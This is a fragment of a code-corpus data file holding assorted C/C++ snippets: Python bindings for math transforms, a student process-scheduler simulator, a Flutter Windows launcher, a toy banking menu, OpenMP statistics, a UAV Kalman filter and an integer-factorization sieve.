(*)(double)) std::sqrt>::operator(), py::arg(\"value\"))\n        .def(\"reset\", &screamer::Transform<(double (*)(double)) std::sqrt>::reset, \"Reset to the initial state.\");\n\n     py::class_<screamer::Transform<(double (*)(double)) std::erf>>(m, \"Erf\")\n        .def(py::init<>())\n        .def(\"__call__\", &screamer::Transform<(double (*)(double)) std::erf>::operator(), py::arg(\"value\"))\n        .def(\"reset\", &screamer::Transform<(double (*)(double)) std::erf>::reset, \"Reset to the initial state.\");\n\n     py::class_<screamer::Transform<(double (*)(double)) std::erfc>>(m, \"Erfc\")\n        .def(py::init<>())\n        .def(\"__call__\", &screamer::Transform<(double (*)(double)) std::erfc>::operator(), py::arg(\"value\"))\n        .def(\"reset\", &screamer::Transform<(double (*)(double)) std::erfc>::reset, \"Reset to the initial state.\");\n\n     py::class_<screamer::Transform<(double (*)(double))screamer::signum<double> >>(m, \"Sign\")\n        .def(py::init<>())\n        .def(\"__call__\", &screamer::Transform<(double (*)(double)) screamer::signum<double>>::operator(), py::arg(\"value\"))\n        .def(\"reset\", &screamer::Transform<(double (*)(double)) screamer::signum<double>>::reset, \"Reset to the initial state.\");\n\n     py::class_<screamer::Transform<(double (*)(double)) std::tanh>>(m, \"Tanh\")\n        .def(py::init<>())\n        .def(\"__call__\", &screamer::Transform<(double (*)(double)) std::tanh>::operator(), py::arg(\"value\"))\n        .def(\"reset\", &screamer::Transform<(double (*)(double)) std::tanh>::reset, \"Reset to the initial state.\");\n\n     py::class_<screamer::Transform<(double (*)(double)) screamer::relu>>(m, \"Relu\")\n        .def(py::init<>())\n        .def(\"__call__\", &screamer::Transform<(double (*)(double)) screamer::relu>::operator(), py::arg(\"value\"))\n        .def(\"reset\", &screamer::Transform<(double (*)(double)) screamer::relu>::reset, \"Reset to the initial state.\");\n\n     py::class_<screamer::Transform<(double (*)(double)) screamer::selu>>(m, \"Selu\")\n        .def(py::init<>())\n        .def(\"__call__\", &screamer::Transform<(double (*)(double)) screamer::selu>::operator(), py::arg(\"value\"))\n        .def(\"reset\", &screamer::Transform<(double (*)(double)) screamer::selu>::reset, \"Reset to the initial state.\");\n\n     py::class_<screamer::Transform<(double (*)(double)) screamer::elu>>(m, \"Elu\")\n        .def(py::init<>())\n        .def(\"__call__\", &screamer::Transform<(double (*)(double)) screamer::elu>::operator(), py::arg(\"value\"))\n        .def(\"reset\", &screamer::Transform<(double (*)(double)) screamer::elu>::reset, \"Reset to the initial state.\");\n\n     py::class_<screamer::Transform<(double (*)(double)) screamer::softsign>>(m, \"Softsign\")\n        .def(py::init<>())\n        .def(\"__call__\", &screamer::Transform<(double (*)(double)) screamer::softsign>::operator(), py::arg(\"value\"))\n        .def(\"reset\", &screamer::Transform<(double (*)(double)) screamer::softsign>::reset, \"Reset to the initial state.\");\n\n     py::class_<screamer::Transform<(double (*)(double)) screamer::sigmoid>>(m, \"Sigmoid\")\n        .def(py::init<>())\n        .def(\"__call__\", &screamer::Transform<(double (*)(double)) screamer::sigmoid>::operator(), py::arg(\"value\"))\n        .def(\"reset\", &screamer::Transform<(double (*)(double)) screamer::sigmoid>::reset, \"Reset to the initial state.\");\n\n     py::class_<screamer::Linear, screamer::ScreamerBase>(m, \"Linear\")\n        .def(py::init<double, double>(), py::arg(\"scale\"), py::arg(\"shift\"))\n        .def(\"__call__\", &screamer::Linear::operator(), py::arg(\"value\"))\n        .def(\"reset\", &screamer::Linear::reset, \"Reset to the ",
    "#include <stdio.h>\n#include <conio2.h>\n#include <ctype.h>\n#include <windows.h>\n#include <stdlib.h>\n#include <string.h>\n#include <time.h>\n// Par\u00e2metros de cores (5:Roxo, 2:Verde)\n#include \"TadFilaCircularPrioridadeDePonteiros.h\" // TAD Para Fila De Prontos\n#include \"TadFilaComum.h\" // TAD para Fila de Espera e Bloqueados\n\nvoid Moldura(int CI, int LI, int CF, int LF, int CorT, int CorF) \n{\n    int i;\n    textcolor(CorT);\n    textbackground(CorF);\n    gotoxy(CI, LI); printf(\"%c\", 201);\n    gotoxy(CI, LF); printf(\"%c\", 200);\n    gotoxy(CF, LI); printf(\"%c\", 187);\n    gotoxy(CF, LF); printf(\"%c\", 188);\n\n    for (i = CI + 1; i < CF; i++) {\n        gotoxy(i, LI); printf(\"%c\", 205);\n        gotoxy(i, LF); printf(\"%c\", 205);\n    }\n    for (i = LI + 1; i < LF; i++) {\n        gotoxy(CI, i); printf(\"%c\", 186);\n        gotoxy(CF, i); printf(\"%c\", 186);\n    }\n    textcolor(7);\n    textbackground(0);\n}\n\nvoid criaTabelaPCB()\n{\n    gotoxy(65, 5);\n    textcolor(2);\n    printf(\"TABELA PCB\");\n    Moldura(27, 6, 116, 9, 5, 0); // Quadrado da tabela PCB\n    gotoxy(29, 7);\n    textcolor(2);\n    printf(\"PID | PRIORIDADE | ESTADO | T.EXECUCAO |  T.ESPERA  | T.RESTANTE | T.BLOQUEADO | FILHO\");\n    textcolor(15);\n}\n\nvoid Menu(void) \n{\n    textcolor(3);\n    Moldura(48, 13, 74, 20, 0, 5); // Quadrado interno\n    textcolor(2);\n    gotoxy(50, 15); printf(\"[A] - Iniciar Simulacao\");\n    gotoxy(53, 18); printf(\"[ESC] - Finalizar\");\n}\n\nvoid nomeTrab()\n{\n    textcolor(2);\n    int x = 15;\n    int y = 3;\n    gotoxy(x, y);\n    char linha[200];\n    FILE *Ptr = fopen(\"letreiro.txt\", \"r\");\n    fgets(linha, sizeof(linha), Ptr);\n    while (!feof(Ptr))\n    {\n        gotoxy(x, y);\n        printf(\"%s\", linha);\n        fgets(linha, sizeof(linha), Ptr);\n        y++;\n    }\n    gotoxy(x, y);\n    printf(\"%s\", linha);\n    \n    textcolor(15);\n    gotoxy(25, 26);\n    printf(\"Trabalho feito por \");\n    textcolor(2);\n    printf(\"Leandro Marcos C. Rodrigues \");\n    textcolor(15);\n    printf(\"e \");\n    textcolor(2);\n    printf(\"Victor Hugo D. Oliveira\");\n    gotoxy(26, 27);\n    textcolor(15);\n    printf(\"Disciplina De Sistemas Operacionais I || Professor \");\n    textcolor(5);\n    printf(\"Robson A. Siscoutto\");\n}\n\nchar Quadro() \n{\n    clrscr();\n    Moldura(1, 1, 120, 30, 0, 5); // Quadrado grande/principal\n    Menu(); // Op\u00e7\u00f5es do menu\n    nomeTrab(); // Letreiro Grande\n    gotoxy(120, 30);\n    return toupper(getch());\n}\n\nvoid criaQuadExecucao() {\n    gotoxy(10, 3);\n    textcolor(2);\n    printf(\"EXECUCAO\");\n    Moldura(3, 4, 25, 11, 5, 0); // Quadrado interno\n    textcolor(2);\n    gotoxy(5, 5);\n    printf(\"PID: \");\n    textcolor(15);\n    gotoxy(5, 6);\n    textcolor(2);\n    printf(\"T.RESTANTE ATUAL: \");\n    textcolor(15);\n    gotoxy(5, 7);\n    textcolor(2);\n    printf(\"CPU-BURST: \");\n    textcolor(15);\n    printf(\"10u.t\");\n    gotoxy(5, 8);\n    textcolor(2);\n    printf(\"PRIORIDADE: \");\n    textcolor(15);\n    gotoxy(5, 9);\n    textcolor(2);\n    printf(\"ESTADO: \");\n    textcolor(15);\n    gotoxy(5, 10);\n    textcolor(2);\n    printf(\"CRIOU FILHO: \");\n    textcolor(15);\n    gotoxy(120, 30);\n}\n\nvoid criaQuadFilaBloqueadoKEYBOARD(TpFilaControl* FBloqKB) {\n    Moldura(3, 12, 118, 16, 5, 0); \n    gotoxy(53, 11);\n    textcolor(2);\n    printf(\"FILA DE BLOQUEADOS TECLADO\");\n    textbackground(0);\n    for (int i = 13; i < 16; i++) { \n        for (int j = 4; j < 118; j++) {  \n            gotoxy(j, i);\n            printf(\" \"); \n        }\n    }\n    textcolor(2);\n    if (FilaVaziaF(FBloqKB)) \n\t{\n        gotoxy(55, 14);\n        printf(\"V A Z I A\");\n    }\n    else \n\t{\n        ExibirFilaFCIMA(FBloqKB,1);\n    }\n    Moldura(3, 18, 118, 22, 0, 0); \n    gotoxy(120, 30);\n}\n\nvoid criaQuadFilaBloqueadoMOUSE(TpFilaControl* FBloqMOUSE) {\n    Moldura(3, 12, 118, 16, 5, 0); \n    gotoxy(53, 11);\n    textcolor(2);\n    printf(\"FILA DE BLOQUEADOS MOUSE  \");\n    textbackground(0);\n    for (int i = 13; i < 16; i++) { \n        for (int j = 4; j < 118; j++) {  \n            gotoxy(j, i);\n            printf(\" \"); \n        }\n    }\n    textcolor(2);\n    if (FilaVaziaF(FBloqMOUSE)) {\n        gotoxy(55, 14);\n        printf(\"V A Z I A\");\n    }\n    else \n\t{\n        ExibirFilaFCIMA(FBloqMOUSE,1);\n    }\n    gotoxy(120, 30);\n}\n\nvoid criaQuadFilaBloqueadoHD(TpFilaControl* FBloqHD) {\n\tlimparAreaFilaEspera();\n    Moldura(3, 18, 118, 22, 5, 0); \n    gotoxy(53, 17);\n    textcolor(2);\n    printf(\"FILA DE BLOQUEADOS HD\");\n    textbackground(0);\n    for (int i = 19; i < 22; i++) { \n        for (int j = 4; j < 118; j++) {  \n            gotoxy(j, i);\n            printf(\" \"); \n        }\n    }\n    textcolor(2);\n    if (FilaVaziaF(FBloqHD)) \n\t{\n        gotoxy(55, 20);\n        printf(\"V A Z I A\");\n    }\n    else \n\t{\n        ExibirFilaFBAIXO(FBloqHD,1);\n    }\n    gotoxy(120, 30);\n}\n\nvoid criaQuadFilaEspera(TpFilaControl* FEspera) { // Cabe 16 processos nas FILAS da interface\n\tlimparAreaFilaEspera();\n    Moldura(3, 18, 118, 22, 5, 0); \n    gotoxy(53, 17);\n    textcolor(2);\n    printf(\"FILA DE ESPERA\");\n    textbackground(0);\n    f",
    "#include <blob.h>\r\n#include <cstdio>\r\n\r\nBlob::Blob() {\r\n\treset();\r\n}\r\nBlob::Blob(Blob& orig) {\r\n\treset();\r\n\t// write from orig to self\r\n\twrite_blob(orig);\r\n}\r\n\r\nvoid Blob::reset() {\r\n\tm_data.clear();\r\n}\r\n\r\nvoid Blob::write_blob(Blob& source) {\r\n\twrite_raw(source.data(),source.size());\r\n}\r\nvoid Blob::write_raw(const void* source, size_t len) {\r\n\tif(len == 0) return;\r\n\tif(source == nullptr) {\r\n\t\tstd::printf(\"Blob::write_raw(): error: attempt to write to %p from null source\",\r\n\t\t\tsource\r\n\t\t);\r\n\t\tstd::exit(-1);\r\n\t}\r\n\r\n\tauto src_bytes = static_cast<const uint8_t*>(source);\r\n\tfor(size_t i=0; i<len; i++) {\r\n\t\tm_data.push_back(*src_bytes++);\r\n\t}\r\n}\r\nvoid Blob::write_u8(uint32_t n) {\r\n\tm_data.push_back(n & 0xFF);\r\n}\r\nvoid Blob::write_u16(uint32_t n) {\r\n\twrite_u8(n);\r\n\twrite_u8(n>>8);\r\n}\r\nvoid Blob::write_u32(uint32_t n) {\r\n\twrite_u16(n);\r\n\twrite_u16(n>>16);\r\n}\r\n\r\nvoid Blob::write_str(const std::string& str, bool no_terminator) {\r\n\tfor(int i=0; i<str.size(); i++) {\r\n\t\tchar chr = str.at(i);\r\n\t\twrite_u8(chr);\r\n\t}\r\n\tif(!no_terminator) {\r\n\t\twrite_u8(0);\r\n\t}\r\n}\r\nauto Blob::hash() const -> uint32_t {\r\n\tuint64_t fullhash = 0x811C9DC4;\r\n\tfor(int i=0; i<size(); i++) {\r\n\t\tfullhash = ((fullhash ^ m_data[i]) * 0x1000193) & 0xFFFFFFFF;\r\n\t}\r\n\treturn static_cast<uint32_t>(fullhash);\r\n}\r\n\r\nbool Blob::send_file(std::string filename, bool strict) {\r\n\tauto file = std::fopen(filename.c_str(),\"wb\");\r\n\tif(!file) {\r\n\t\tif(strict) {\r\n\t\t\tstd::printf(\"Blob::send_file(): error: unable to send to file %s\\n\",\r\n\t\t\t\tfilename.c_str()\r\n\t\t\t);\r\n\t\t\tstd::exit(-1);\r\n\t\t}\r\n\t\treturn false;\r\n\t}\r\n\tstd::fwrite(data(),sizeof(char),size(),file);\r\n\tstd::fclose(file);\r\n\treturn true;\r\n}\r\n\r\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"sun_moon_theme_switch_button\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <iostream>\r\n#include <string>  // For string handling\r\nusing namespace std;\r\n\r\nint balance = 10000;\r\nconst int PIN = 1234;  // Pre-defined 4-digit PIN for simplicity\r\n\r\nvoid displaymenu() {\r\n    cout << \"=================================================\" << \"\\n\";\r\n    cout << \"                        MENU                        \" << \"\\n\";\r\n    cout << \"=================================================\" << \"\\n\";\r\n    cout << \"       1. Balance    \" << \"\\n\";\r\n    cout << \"       2. Deposit    \" << \"\\n\";\r\n    cout << \"       3. Withdrawal    \" << \"\\n\";\r\n    cout << \"       4. Transfer  \" << \"\\n\";\r\n    cout << \"       5. Exit   \" << \"\\n\";\r\n}\r\n\r\nint bal() {\r\n    return balance;\r\n}\r\n\r\nint deposit(int dep) {\r\n    balance += dep;\r\n    return balance;\r\n}\r\n\r\nint withdraw(int amount) {\r\n    if (amount > balance) {\r\n        cout << \"Insufficient balance!\" << \"\\n\";\r\n    } else {\r\n        balance -= amount;\r\n    }\r\n    return balance;\r\n}\r\n\r\nint transfer(int amount, string number, int entered_pin) {\r\n    if (amount > balance) {\r\n        cout << \"Insufficient balance to transfer!\" << \"\\n\";\r\n    } else if (entered_pin != PIN) {\r\n        cout << \"Incorrect PIN! Transfer failed.\" << \"\\n\";\r\n    } else {\r\n        balance -= amount;\r\n        cout << \"Transfer to \" << number << \" successful!\" << \"\\n\";\r\n    }\r\n    return balance;\r\n}\r\n\r\nbool verifyPin() {\r\n    int entered_pin;\r\n    for (int attempts = 0; attempts < 3; attempts++) { // Allow 3 attempts\r\n        cout << \"Enter your 4-digit PIN: \";\r\n        cin >> entered_pin;\r\n\r\n        if (entered_pin == PIN) {\r\n            return true; // PIN is correct\r\n        } else {\r\n            cout << \"Incorrect PIN! You have \" << (2 - attempts) << \" attempts left.\" << \"\\n\";\r\n        }\r\n    }\r\n    cout << \"Too many incorrect attempts. Operation denied.\" << \"\\n\";\r\n    return false; // PIN is incorrect after 3 attempts\r\n}\r\n\r\nint main() {\r\n    string ussd_code;\r\n    int choice, amount;\r\n    string transfer_number;\r\n    char confirm = 'y'; // Declare and initialize confirm\r\n\r\n    // Simulate USSD input\r\n    cout << \"Please enter USSD code (e.g., *537#): \";\r\n    cin >> ussd_code;\r\n\r\n    // Check if the input matches *537#\r\n    if (ussd_code == \"*537#\") {\r\n        while (confirm == 'y' || confirm == 'Y') {\r\n            displaymenu();\r\n            cout << \"Enter your choice (1-5): \\n\";\r\n            cin >> choice;\r\n\r\n            switch (choice) {\r\n                case 1: // Balance\r\n                    if (verifyPin()) {\r\n                        cout << \"Your account balance is \" << bal() << \"\\n\";\r\n                    }\r\n                    break;\r\n\r\n                case 2: // Deposit\r\n                    if (verifyPin()) {\r\n                        cout << \"Enter the deposit amount: \";\r\n                        cin >> amount;\r\n                        cout << \"Your updated account balance is \" << deposit(amount) << '\\n';\r\n                    }\r\n                    break;\r\n\r\n                case 3: // Withdrawal\r\n                    if (verifyPin()) {\r\n                        cout << \"Enter the amount to withdraw: \";\r\n                        cin >> amount;\r\n                        cout << \"Your updated account balance is \" << withdraw(amount) << '\\n';\r\n                    }\r\n                    break;\r\n\r\n                case 4: // Transfer\r\n                    if (verifyPin()) {\r\n                        cout << \"Enter the recipient's phone number: \";\r\n                        cin >> transfer_number;\r\n                        cout << \"Enter the amount to transfer: \";\r\n                        cin >> amount;\r\n                        cout << \"Enter your 4-digit PIN to confirm: \";\r\n                        int entered_pin; // Declare entered_pin for transfer confirmation\r\n                        cin >> entered_pin;\r\n                        cout << \"Your updated account balance is \" << transfer(amount, transfer_number, entered_pin) << '\\n';\r\n                    }\r\n                    break;\r\n\r\n                case 5: // Exit\r\n                    cout << \"Exiting the program.\" << \"\\n\";\r\n                    return 0; // Exit the program\r\n\r\n                default:\r\n                    cout << \"Invalid choice!\" << \"\\n\";\r\n                    break;\r\n            }\r\n\r\n            // Ask if the user wants to continue\r\n            cout << \"\\nPress 'y' or 'Y' to continue, or any other key to exit: \";\r\n            cin >> confirm; // Get confirmation from the user\r\n        }\r\n    } else {\r\n        cout << \"Invalid USSD code. Exiting program.\" << endl;\r\n    }\r\n\r\n    return 0;\r\n}\r\n",
    "// statistics.cpp\n#include \"statistics.h\"\n#include <omp.h>\n#include <cmath>\n#include <iostream>\n// Function to compute the mean\ndouble computeMean(const std::vector<int>& data, int num_threads) {\n    double sum = 0.0;\n\n    #pragma omp parallel for reduction(+:sum) num_threads(num_threads)\n    for (size_t i = 0; i < data.size(); i++) {\n        sum += data[i];\n    }\n\n    return sum / data.size();\n}\n\n// Function to compute the standard deviation\ndouble computeStandardDeviation(const std::vector<int>& data, int num_threads) {\n    double mean = computeMean(data, num_threads);\n\n    double variance_sum = 0.0;\n\n    #pragma omp parallel for reduction(+:variance_sum) num_threads(num_threads)\n    for (size_t i = 0; i < data.size(); i++) {\n        variance_sum += (data[i] - mean) * (data[i] - mean);\n    }\n\n    double variance = variance_sum / data.size();\n    return std::sqrt(variance);\n}\n\n\nint main() {\n    // Data set\n    std::vector<int> data = {1, 2, 3, 4, 5, 6};\n\n    // Number of threads for OpenMP\n    int num_threads = 4;\n\n    // Calculate and print the standard deviation\n    double stddev = computeStandardDeviation(data, num_threads);\n    std::cout << \"Standard Deviation: \" << stddev << std::endl;\n\n    return 0;\n}\n",
    "#include <Eigen/Dense>\n#include <cmath>\n#include <fstream>\n#include <chrono>\n#include <iomanip>\n#include <queue>\n#include <thread>\n#include <mutex>\n#include <random>\n#include <iostream>\n#include <sstream>\n#include \"UAV.h\"\n\n// \u0423\u043b\u0443\u0447\u0448\u0435\u043d\u043d\u044b\u0435 \u0440\u0435\u0430\u043b\u0438\u0437\u0430\u0446\u0438\u0438 \u0434\u043b\u044f GPS \u0438 INS\nclass GPS {\npublic:\n    Eigen::Vector3d get_position() {\n        static std::default_random_engine generator;\n        static std::normal_distribution<double> distribution(0.0, 1.0);\n        return Eigen::Vector3d(distribution(generator), distribution(generator), distribution(generator));\n    }\n\n    Eigen::Vector3d get_velocity() {\n        static std::default_random_engine generator;\n        static std::normal_distribution<double> distribution(0.0, 0.1);\n        return Eigen::Vector3d(distribution(generator), distribution(generator), distribution(generator));\n    }\n\n    double get_time() {\n        static auto start = std::chrono::steady_clock::now();\n        auto now = std::chrono::steady_clock::now();\n        return std::chrono::duration<double>(now - start).count();\n    }\n};\n\nclass INS {\npublic:\n    Eigen::Vector3d get_acceleration() {\n        static std::default_random_engine generator;\n        static std::normal_distribution<double> distribution(0.0, 0.01);\n        return Eigen::Vector3d(distribution(generator), distribution(generator), distribution(generator));\n    }\n\n    Eigen::Vector3d get_angular_velocity() {\n        static std::default_random_engine generator;\n        static std::normal_distribution<double> distribution(0.0, 0.001);\n        return Eigen::Vector3d(distribution(generator), distribution(generator), distribution(generator));\n    }\n};\n\nclass Barometer {\npublic:\n    double get_altitude() {\n        static std::default_random_engine generator;\n        static std::normal_distribution<double> distribution(100.0, 0.1);\n        return distribution(generator);\n    }\n};\n\nclass IntegrationSystem {\nprotected:\n    GPS* gps;\n    INS* ins;\n    Barometer* barometer;\n    \n    Eigen::VectorXd x; // \u0412\u0435\u043a\u0442\u043e\u0440 \u0441\u043e\u0441\u0442\u043e\u044f\u043d\u0438\u044f: [x, y, z, vx, vy, vz, ax, ay, az, roll, pitch, yaw, gyro_bias_x, gyro_bias_y, gyro_bias_z]\n    Eigen::MatrixXd P; // \u041a\u043e\u0432\u0430\u0440\u0438\u0430\u0446\u0438\u043e\u043d\u043d\u0430\u044f \u043c\u0430\u0442\u0440\u0438\u0446\u0430\n    Eigen::MatrixXd Q; // \u041a\u043e\u0432\u0430\u0440\u0438\u0430\u0446\u0438\u043e\u043d\u043d\u0430\u044f \u043c\u0430\u0442\u0440\u0438\u0446\u0430 \u0448\u0443\u043c\u0430 \u043f\u0440\u043e\u0446\u0435\u0441\u0441\u0430\n    Eigen::MatrixXd R; // \u041a\u043e\u0432\u0430\u0440\u0438\u0430\u0446\u0438\u043e\u043d\u043d\u0430\u044f \u043c\u0430\u0442\u0440\u0438\u0446\u0430 \u0448\u0443\u043c\u0430 \u0438\u0437\u043c\u0435\u0440\u0435\u043d\u0438\u0439\n\n    std::queue<Eigen::Vector3d> flight_path;\n    std::mutex flight_path_mutex;\n    std::thread flight_path_thread;\n    bool is_running;\n\n    std::ofstream log_file;\n\n    // \u041f\u0430\u0440\u0430\u043c\u0435\u0442\u0440\u044b \u0411\u041f\u041b\u0410\n    double mass; // \u043c\u0430\u0441\u0441\u0430 \u0411\u041f\u041b\u0410\n    double drag_coefficient; // \u043a\u043e\u044d\u0444\u0444\u0438\u0446\u0438\u0435\u043d\u0442 \u043b\u043e\u0431\u043e\u0432\u043e\u0433\u043e \u0441\u043e\u043f\u0440\u043e\u0442\u0438\u0432\u043b\u0435\u043d\u0438\u044f\n    double front_area; // \u043f\u043b\u043e\u0449\u0430\u0434\u044c \u043f\u043e\u043f\u0435\u0440\u0435\u0447\u043d\u043e\u0433\u043e \u0441\u0435\u0447\u0435\u043d\u0438\u044f\n\n    // \u0410\u0442\u043c\u043e\u0441\u0444\u0435\u0440\u043d\u0430\u044f \u043c\u043e\u0434\u0435\u043b\u044c\n    std::function<double(double)> atmosphere_model;\n\n    virtual Eigen::VectorXd predict_state(const Eigen::VectorXd& state, double dt) = 0;\n    virtual Eigen::VectorXd predict_measurement(const Eigen::VectorXd& state) = 0;\n\n    void unscented_kalman_filter(const Eigen::VectorXd& measurement, double dt) {\n        int n = x.size();\n        double lambda = 3 - n;\n        \n        // \u0413\u0435\u043d\u0435\u0440\u0430\u0446\u0438\u044f \u0441\u0438\u0433\u043c\u0430-\u0442\u043e\u0447\u0435\u043a\n        Eigen::MatrixXd X(n, 2*n+1);\n        X.col(0) = x;\n        Eigen::MatrixXd P_sqrt = P.llt().matrixL();\n        for (int i = 0; i < n; ++i) {\n            X.col(i+1) = x + std::sqrt(n+lambda) * P_sqrt.col(i);\n            X.col(n+i+1) = x - std::sqrt(n+lambda) * P_sqrt.col(i);\n        }\n        \n        // \u041f\u0440\u043e\u0433\u043d\u043e\u0437\n        Eigen::MatrixXd X_pred(n, 2*n+1);\n        for (int i = 0; i < 2*n+1; ++i) {\n            X_pred.col(i) = predict_state(X.col(i), dt);\n        }\n        \n        Eigen::VectorXd x_pred = X_pred * Eigen::VectorXd::Constant(2*n+1, 1.0/(2*(n+lambda)));\n        x_pred += lambda/(n+lambda) * (X_pred.col(0) - x_pred);\n        \n        Eigen::MatrixXd P_pred = Q;\n        for (int i = 0; i < 2*n+1; ++i) {\n            Eigen::VectorXd diff = X_pred.col(i) - x_pred;\n            P_pred += (i == 0 ? lambda/(n+lambda) : 1.0/(2*(n+lambda))) * diff * diff.transpose();\n        }\n        \n        // \u041e\u0431\u043d\u043e\u0432\u043b\u0435\u043d\u0438\u0435\n        Eigen::MatrixXd Z_pred(measurement.size(), 2*n+1);\n        for (int i = 0; i < 2*n+1; ++i) {\n            Z_pred.col(i) = predict_measurement(X_pred.col(i));\n        }\n        \n        Eigen::VectorXd z_pred = Z_pred * Eigen::VectorXd::Constant(2*n+1, 1.0/(2*(n+lambda)));\n        z_pred += lambda/(n+lambda) * (Z_pred.col(0) - z_pred);\n        \n        Eigen::MatrixXd S = R;\n        Eigen::MatrixXd C = Eigen::MatrixXd::Zero(n, measurement.size());\n        for (int i = 0; i < 2*n+1; ++i) {\n            Eigen::VectorXd diff_z = Z_pred.col(i) - z_pred;\n            Eigen::VectorXd diff_x = X_pred.col(i) - x_pred;\n            double weight = (i == 0) ? lambda/(n+lambda) : 1.0/(2*(n+lambda));\n            S += weight * diff_z * diff_z.transpose();\n            C += weight * diff_x * diff_z.transpose();\n        }\n        \n        Eigen::MatrixXd K = C * S.inverse();\n        x = x_pred + K * (measurement - z_pred);\n        P = P_pred - K * S * K.transpose();\n        \n        log(\"UKF update completed\");\n    }\n\n",
    "#include <vector>\n#include <numeric>\n#include \"congruence.cpp\"\n#include <iostream>\n\nstd::vector<Parity> calcuateParities(const std::vector<Congruence>& congruences) {\n    std::vector<Parity> parities;\n\n    for (auto cg : congruences) {\n        auto results = cg.parities();\n        auto &[left, right] = results;\n        left.pXor(right);\n        parities.push_back(left);\n    }\n\n    return parities;\n}\n\n// /**\n//  * Convert a list of Parities into pseudo row-echelon form and return\n//  * the set of Parities XORd together\n//  */\n// std::vector<std::set<int>> convertRowEchelon(std::vector<Parity>& parities) {\n    \n// }\n\nstd::vector<Congruence> findSquareSolutions(const std::vector<Congruence> congruences) {\n    auto parities = calcuateParities(congruences);\n\n    // Tracks which of the original parities need to be XOR'ed together to\n    // construct each item in `parities`\n    std::vector<std::set<int>> components;\n    for (auto i = 0; i < parities.size(); i++) {\n        components.push_back({ i });\n    }\n\n    for (auto i = 0; i < parities.size(); i++) {\n        Parity& refParity = parities[i];\n\n        // Find the first odd parity bit\n        int firstOddIdx = refParity.firstOddIdx();\n        if (firstOddIdx == -1) {\n            continue; // All exponents are even, so skip this one\n        }\n\n        // XOR the parity lists, so that refParity is the only\n        // one with a 1 at firstOddIdx\n        for (auto j = i+1; j < parities.size(); j++) {\n            if (parities[j].bits()[firstOddIdx]) {\n                // If a Parity p is in both sets, it becomes p^2 which is always all even,\n                // so it has no effect in the XOR. Symmetric difference removes these.\n                components[j] = set_symmetric_difference(components[j], components[i]);\n                \n                parities[j].pXor(refParity);\n            }\n        }\n    }\n\n    // Collect solutions\n    std::vector<std::set<int>> idxSets;\n    for (auto i = 0; i < parities.size(); i++) {\n        if (parities[i].allEven()) {\n            idxSets.push_back(components[i]);\n        }\n    }\n\n    std::vector<Congruence> solutions;\n    for (auto idxSet : idxSets) {\n        std::vector<Congruence> cl;\n        for (auto idx : idxSet) {\n            cl.push_back(congruences[idx]);\n        }\n        auto cProduct = Congruence::product(cl);\n        solutions.push_back(cProduct);\n    }\n\n    return solutions;\n}\n\n/**\n * Check if the given Congruence solution gives non-trivial factors of n.\n * \n * @param solution the Congruence to check\n * \n * @return a pair containing the two found factors of n and a boolean\n * indicating whether the solution is non-trivial\n */\nstd::pair<std::pair<int, int>, bool> checkSolution(Congruence& solution) {\n    solution.simplify();\n    solution.sqrt();\n    auto cSqrt = solution.evaluate();\n    auto &[left, right] = cSqrt;\n    auto n = solution.n;\n\n    int p, q;\n    auto nonTrivial = true;\n    p = std::gcd(right-left, n);\n    if (p != 1 && p != n) {\n        q = n / p;\n    } else {\n        q = std::gcd(right+left, n);\n        if (q != 1 && q != n) {\n            p = n / q;\n        } else {\n            nonTrivial = false;\n        }\n    }\n\n    return {{p, q}, nonTrivial};\n}\n\nstd::pair<bool, std::vector<int>> primeFactors(int val, const std::vector<int>& primes) {\n    std::vector<int> exponents(primes.size());\n\n    for (auto i = 0; i < primes.size(); i++) {\n        auto prime = primes[i];\n        while (val % prime == 0) {\n            val /= prime;\n            exponents[i]++;\n        }\n    }\n\n    auto smooth = val == 1;\n    return { smooth, exponents };\n}\n\n/**\n * Sieve for values where z and z+n are B-smooth.\n * \n * B-smooth values are those which have all of their prime factors in `primes`.\n * \n * @param n number to add to each value tested for B-smoothness\n * @param primes list of primes to check for B-smoothness over\n * \n * @return list of Congruences z \u2261 z+n mod n where z and z+n are B-smooth\n */\nstd::vector<Congruence> sieve(int n, std::shared_ptr<const std::vector<int>>& primes) {\n    std::vector<Congruence> congruences;\n    \n    for (auto z = 2; z < n && congruences.size() < primes->size()+10; z++) {\n        auto zResult = primeFactors(z, *primes.get());\n        auto &[zSmooth, zExponents] = zResult;\n        if (zSmooth) {\n            auto znResult = primeFactors(z+n, *primes.get());\n            auto &[znSmooth, znExponents] = znResult;\n            if (znSmooth) {\n                Congruence cg (primes, n, zExponents, znExponents);\n                congruences.push_back(cg);\n            }\n        }\n    }\n\n    return congruences;\n}\n\n/**\n * Find factors of the given number.\n * \n * @param n number to factor\n * \n * @return pair of factors of n\n */\nstd::pair<int, int> factorize(int n) {\n    const std::vector<int> primes = { 2, 3, 5, 7, 11, 13, 17, 19, 23, 29 };\n    auto sharedPrimes = std::make_shared<const std::vector<int>>(primes);\n    auto congruences = sieve(n, sharedPrimes);\n    \n    auto solutions = findSquareSolutions(congruenc",
